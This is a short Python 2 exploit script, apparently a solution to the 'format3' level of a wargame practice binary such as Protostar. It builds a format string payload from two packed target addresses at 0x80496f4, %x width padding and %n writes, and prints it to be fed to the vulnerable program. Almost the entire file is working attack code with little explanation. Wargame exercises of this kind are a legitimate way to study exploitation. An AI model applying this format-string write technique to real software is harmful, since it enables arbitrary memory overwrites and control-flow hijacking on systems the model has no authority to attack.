#!/usr/bin/python

import struct

#NOTE
#./format3 $(./exploit.py)

BUF = 512
TARGET_P1 = struct.pack("I" , 0x80496f4)
TARGET_P2 = struct.pack("I" , 0x80496f4 + 2)

def pad(msg):
    return msg.ljust(BUF , 'X')
#This function to fill up the buffer so be sure the stack will not move forword or backword in the different env variables


exploit = "AAAA" + TARGET_P1 + TARGET_P2 
exploit += "%13$21816x"
exploit += "%13$n"
exploit += "%14$43966x"
exploit += "%14$n"

print exploit
